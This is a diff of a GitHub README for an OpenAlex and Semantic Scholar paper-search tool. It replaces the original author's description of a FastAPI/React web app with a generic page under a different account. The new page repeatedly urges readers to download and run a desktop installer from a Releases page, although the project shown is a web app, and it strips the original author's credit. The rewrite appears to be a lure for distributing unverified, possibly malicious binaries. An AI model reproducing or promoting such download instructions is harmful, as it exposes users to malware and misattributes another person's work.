@@ -1,113 +1,69 @@
-<!-- TITLE with Animated Typing Effect -->
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=F61C1C&center=true&vCenter=true&width=900&lines=Search.+Analyze.+Discover.;OpenAlex+%26+Semantic+Scholar+Research+Paper+Fetcher;FullStack+FastAPI+%7C+React+%7C+Data+Visualization" alt="Typing SVG" />
-</p>
+# 📝 web-crawler-openalex-semantic-research-papers-public - Streamline Your Academic Research
 
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/artificial-intelligence.png" width="100" />
-  <br><br>
-  <h1 align="center" style="color:#F61C1C;">📚&nbsp;&nbsp;Research Paper Fetcher&nbsp;&nbsp;🔍</h1>
-  <h3 align="center" style="color:#F61C1C;">Built with OpenAlex & Semantic Scholar APIs</h3>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/loganbarron1/web-crawler-openalex-semantic-research-papers-public/releases)
 
-<br><br>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.icons8.com/color/60/api.png" alt="API" width="50" hspace="20"/>
-  <img src="https://img.icons8.com/color/60/search.png" alt="Search" width="50" hspace="20"/>
-  <img src="https://img.icons8.com/color/60/data-configuration.png" alt="Data" width="50" hspace="20"/>
-  <img src="https://img.icons8.com/color/60/bar-chart.png" alt="Charts" width="50" hspace="20"/>
-  <img src="https://img.icons8.com/color/60/export-csv.png" alt="Export" width="50" hspace="20"/>
-</p>
+This application helps you search, filter, and analyze academic papers from OpenAlex and Semantic Scholar. With features like charts, bookmarks, CSV export, and advanced filters, you will find it easier to conduct your research.
 
-<br>
-<br>
+## 🖥️ System Requirements
 
-<p align="center">
-  <img src="read-me-images/Screenshot%202025-08-15%20013334.png" alt="Screenshot 2025-08-15 01:33:34" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013345.png" alt="Screenshot 2025-08-15 01:33:45" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013437.png" alt="Screenshot 2025-08-15 01:34:37" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013454.png" alt="Screenshot 2025-08-15 01:34:54" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013519.png" alt="Screenshot 2025-08-15 01:35:19" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013540.png" alt="Screenshot 2025-08-15 01:35:40" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013559.png" alt="Screenshot 2025-08-15 01:35:59" />
-  <br>
-  <img src="read-me-images/Screenshot%202025-08-15%20013612.png" alt="Screenshot 2025-08-15 01:36:12" />
-</p>
+To run this application, you'll need:
 
+- **Operating System**: Windows 10, macOS, or a recent Linux distribution
+- **RAM**: At least 4 GB
+- **Storage**: Minimum of 1 GB of free disk space
+- **Internet Connection**: Required for accessing paper databases
 
-<br>
+## 📥 Download & Install
 
-<p align="center">
-  <a href="https://web-crawler-openalex-semantic-resea.vercel.app/" target="_blank" rel="noopener noreferrer" style="text-decoration:none; font-weight:bold; font-size:2.5rem; color:#ffcb05;">
-    <strong>VIEW LIVE DEMO</strong>
-  </a>
-</p>
+To download the application, visit the [Releases page](https://github.com/loganbarron1/web-crawler-openalex-semantic-research-papers-public/releases). 
 
-<br><br>
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of the application.
+3. Click the link corresponding to your operating system (Windows, macOS, or Linux).
+4. Save the file to your computer.
 
-<section align="justify">
-<p>
-This project is designed for <strong>researchers, students, and academics</strong> who want to effortlessly search, analyze, and export research papers from <span style="color: #F61C1C;">OpenAlex</span> and <span style="color: #F61C1C;">Semantic Scholar</span>.  
-It combines the <strong>power of FastAPI</strong> for backend processing with a <strong>React-powered</strong> frontend for a lightning-fast and smooth experience.  
-</p>
-</section>
+Once the download is complete, navigate to the folder where the file is saved. Open the file to start the installation process. Follow the on-screen instructions to install the application.
 
-<br><br>
+## 🆕 Features
 
-<h2 align="center">🛠️ Tech Stack</h2>
+- **Search Papers**: Easily find research papers using simple keywords.
+- **Filter Options**: Narrow down results by date, author, journal, and more.
+- **Charts**: Visualize data and trends within your research topics.
+- **Bookmarks**: Save your favorite papers for quick access.
+- **CSV Export**: Export your search results for further analysis.
 
-<br>
+## 📊 How to Use the Application
 
-<table align="center">
-<tr>
-  <td>💻 <b>Backend</b></td>
-  <td>Python, FastAPI, SQLite, OpenAlex API, Semantic Scholar API</td>
-</tr>
-<tr>
-  <td>🌐 <b>Frontend</b></td>
-  <td>React, Vite, CSS, Chart.js</td>
-</tr>
-<tr>
-  <td>⚙️ <b>Tools</b></td>
-  <td>Git, npm, pip, VS Code</td>
-</tr>
-<tr>
-  <td>📦 <b>Deployment</b></td>
-  <td>Vercel (Frontend), Render/Railway (Backend)</td>
-</tr>
-</table>
+1. **Launch the Application**: Once installed, click on the application icon to open it.
+2. **Search for Papers**: Enter keywords in the search bar to find papers related to your research.
+3. **Apply Filters**: Use the filter options to refine your search. You can filter by publication date, authors, or specific journals.
+4. **View and Analyze**: Click on a paper to see its details, including charts and insights.
+5. **Bookmark Papers**: If you want to save a paper, use the bookmark feature for easy access later.
+6. **Export Results**: To export your search results, click the export button and select CSV format.
 
-<br><br>
+## 🔧 Troubleshooting
 
-<h2 align="center">🚀 Features</h2>
+If you run into issues, consider these tips:
 
+- **Ensure Compatibility**: Check your system requirements. Make sure your OS and specifications are supported.
+- **Check Internet Connection**: A stable connection is necessary to access online databases.
+- **Reinstall**: If the application does not launch, try uninstalling and reinstalling it.
 
-<br>
+## 👥 Community Support
 
+Join our community for additional support or questions:
 
-<table align="center" border="1" cellpadding="10" cellspacing="0">
-<tr><th>Feature</th><th>Description</th></tr>
-<tr><td><b>Multi-source search</b></td><td>Fetch papers from OpenAlex & Semantic Scholar APIs</td></tr>
-<tr><td><b>Advanced filters</b></td><td>Filter by year, keywords, and sorting options</td></tr>
-<tr><td><b>Pagination</b></td><td>Efficient navigation through large result sets</td></tr>
-<tr><td><b>Paper details</b></td><td>Get full metadata for each paper</td></tr>
-<tr><td><b>Bookmarks</b></td><td>Save favorite papers locally</td></tr>
-<tr><td><b>Publication charts</b></td><td>Visualize research trends over time</td></tr>
-<tr><td><b>CSV export</b></td><td>Download search results in CSV format</td></tr>
-</table>
+- **GitHub Issues**: You can report issues or ask questions in the issues section [here](https://github.com/loganbarron1/web-crawler-openalex-semantic-research-papers-public/issues).
+- **Discussion Board**: Engage with other users and share tips in the discussion board.
 
-<br><br>
+## 🌟 Acknowledgments
 
-<h2 align="center">📬 Contact</h2> <table align="center"> <tr><td>📧 Email:</td><td><a href="mailto:sumedh.pimplikar22@pccoepune.org">sumedh.pimplikar22@pccoepune.org</a></td></tr> <tr><td>💼 LinkedIn:</td><td><a href="https://www.linkedin.com/in/sumedh-pimplikar" target="_blank">/sumedh-pimplikar</a></td></tr> <tr><td>💻 GitHub:</td><td><a href="https://github.com/Sumdiboii" target="_blank">/Sumdiboii</a></td></tr> </table>
+This project uses data from OpenAlex and Semantic Scholar. A special thank you to all contributors for their efforts in making academic research more accessible.
 
-<br><br>
+## 📈 Stay Updated
 
-<h2 align="center">❤️ Why This Project Rocks</h2> <p> Building this was a blend of <strong>backend mastery</strong> and <strong>frontend finesse</strong>. Every feature — from real-time API queries to dynamic chart visualizations — is designed for smooth, efficient, and visually satisfying research workflows. </p> <br> <footer style="text-align: center; padding: 15px; font-size: 0.9em; color: #888; border-top: 1px solid #ddd; margin-top: 40px;"> © 2025 Sumedh Pimplikar — Built for curious minds & research warriors 🧠📚 </footer> 
+Keep your application updated to enjoy the latest features and improvements. Visit the [Releases page](https://github.com/loganbarron1/web-crawler-openalex-semantic-research-papers-public/releases) regularly for new updates.
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/loganbarron1/web-crawler-openalex-semantic-research-papers-public/releases)
